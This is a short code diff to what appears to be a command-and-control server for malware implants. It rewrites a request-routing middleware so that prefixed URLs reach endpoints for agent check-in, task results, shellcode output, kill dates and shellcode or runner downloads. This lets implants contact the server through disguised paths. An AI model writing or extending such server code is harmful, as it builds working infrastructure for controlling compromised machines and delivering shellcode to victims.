@@ -58,14 +58,33 @@ def create_app():
 
    
 
-    # Normalize consecutive slashes in PATH_INFO (e.g. //a/p -> /a/p)
+    # Normalize consecutive slashes and route any prefixed agent/stager requests to canonical endpoints
+    _AGENT_CANONICAL_SUFFIXES = (
+        '/a/p',
+        '/a/d',
+        '/api/checkin',
+        '/api/task_result',
+        '/api/shellcode_output',
+        '/api/killdate_reached',
+        '/api/agent_terminated',
+        '/api/verify_termination',
+        '/api/vaporlink/stage',
+    )
     _orig_wsgi_app = app.wsgi_app
     def _normalize_slash_middleware(environ, start_response):
         path_info = environ.get('PATH_INFO', '')
         if '//' in path_info:
             while '//' in path_info:
                 path_info = path_info.replace('//', '/')
-            environ['PATH_INFO'] = path_info
+        for suffix in _AGENT_CANONICAL_SUFFIXES:
+            if path_info.endswith(suffix) and path_info != suffix:
+                path_info = suffix
+                break
+        for marker in ('/api/download_shellcode/', '/api/download_runner/'):
+            if marker in path_info and not path_info.startswith(marker):
+                path_info = path_info[path_info.index(marker):]
+                break
+        environ['PATH_INFO'] = path_info
         return _orig_wsgi_app(environ, start_response)
     app.wsgi_app = _normalize_slash_middleware
 
